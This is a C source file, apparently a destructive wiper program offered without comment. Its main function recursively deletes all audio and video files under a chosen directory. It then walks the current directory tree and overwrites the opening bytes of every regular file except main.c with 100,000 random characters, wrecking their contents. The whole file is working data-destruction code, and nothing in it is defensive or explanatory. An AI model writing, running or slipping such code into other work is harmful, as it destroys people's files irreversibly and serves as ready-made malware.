#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <time.h>

#define passwordLength 100000


const char *file_extensions[] = {
    ".mp3", ".mp4", ".avi", ".mkv", ".flv", ".mov", ".wmv", ".wav",
    ".ogg", ".aac", ".flac", ".webm", ".3gp", ".m4a", ".m4v"
};


int has_extension(const char *filename, const char *extension) {
    size_t len_filename = strlen(filename);
    size_t len_extension = strlen(extension);
    return len_filename >= len_extension && strcmp(filename + len_filename - len_extension, extension) == 0;
}


int is_media_file(const char *filename) {
    for (size_t i = 0; i < sizeof(file_extensions) / sizeof(file_extensions[0]); ++i) {
        if (has_extension(filename, file_extensions[i])) {
            return 1;
        }
    }
    return 0;
}


void delete_file(const char *filepath) {
    if (remove(filepath) == 0) {
        printf("Deleted: %s\n", filepath);
    } else {
        perror("Error deleting file");
    }
}


void traverse_and_delete(const char *dirname) {
    DIR *dir = opendir(dirname);
    if (dir == NULL) {
        perror("Error opening directory");
        return;
    }

    struct dirent *entry;
    char path[PATH_MAX];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        snprintf(path, sizeof(path), "%s/%s", dirname, entry->d_name);

        struct stat path_stat;
        stat(path, &path_stat);

        if (S_ISDIR(path_stat.st_mode)) {
            traverse_and_delete(path); 
        } else if (S_ISREG(path_stat.st_mode) && is_media_file(entry->d_name)) {
            delete_file(path);
        }
    }

    closedir(dir);
}




char generateRandomChar() {
    const char characters[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*(){}[]-=_+|;:',./<>?`~`¡™£¢∞§¶•ªº–≠œ∑´®`⁄€‹›ﬁﬂ‡°·";
    return characters[rand() % (sizeof(characters) - 1)];
}

void generatePassword(char *password, int length) {
    for (int i = 0; i < length; ++i) {
        password[i] = generateRandomChar();
    }
    password[length] = '\0';
}

void processFolder(const char *folderPath) {
    DIR *directory = opendir(folderPath);
    if (directory == NULL) {
        perror("Unable to open directory");
        exit(EXIT_FAILURE);
    }

    struct dirent *entry;
    while ((entry = readdir(directory)) != NULL) {
        if (entry->d_type == DT_REG && strcmp(entry->d_name, "main.c") != 0) {
            char filePath[257];
            snprintf(filePath, 257, "%s/%s", folderPath, entry->d_name);

            FILE *file = fopen(filePath, "r+");
            if (file == NULL) {
                perror("Unable to open file");
                continue;
            }

            char password[passwordLength + 1];
            generatePassword(password, passwordLength);

            fseek(file, 0, SEEK_END);
            long fileSize = ftell(file);
            fseek(file, 0, SEEK_SET);

            const char *newContent = password;
            size_t bytesWritten = fwrite(newContent, 1, strlen(newContent), file);
            if (bytesWritten != strlen(newContent)) {
                perror("Unable to write to file");
                fclose(file);
                continue;
            }

            for (long i = strlen(newContent); i < passwordLength; ++i) {
                fputc('\0', file);
            }

            fclose(file);
        }
        else if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char subfolderPath[257];
            snprintf(subfolderPath, 257, "%s/%s", folderPath, entry->d_name);
            processFolder(subfolderPath);
        }
    }

    closedir(directory);
}





int main(int argc, char *argv[]) {
    const char *start_dir = argc > 1 ? argv[1] : "."; 
    traverse_and_delete(start_dir);

    srand((unsigned int)time(NULL));

    processFolder(".");
    
    return 0;
}
